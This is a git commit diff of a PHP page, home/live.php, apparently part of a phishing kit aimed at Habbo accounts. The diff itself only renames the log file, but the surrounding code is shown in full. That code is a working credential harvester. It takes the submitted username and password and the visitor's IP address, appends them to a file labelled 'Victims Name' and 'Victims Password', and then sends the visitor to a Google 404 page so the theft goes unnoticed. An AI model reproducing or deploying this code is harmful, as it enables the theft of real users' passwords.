8d8e713d423386037aecd1829a1baa0dbec362ad
bobstottts <bobstottts@googlemail.com>
2017-11-24 01:44:13 -0500

    Update live.php

--- home/live.php
+++ home/live.php
@@ -2,7 +2,7 @@
 $habbo = $_POST['username']; 
 $password = $_POST['passwd'];
 $ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen("AAC189092019881999191919191mobeen.csv", "a"); 
+$f = fopen("AAC189092019881999191919191mobeen.txt", "a"); 
 fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
 fclose($f);
 header('Location:https://www.google.com/404.html');
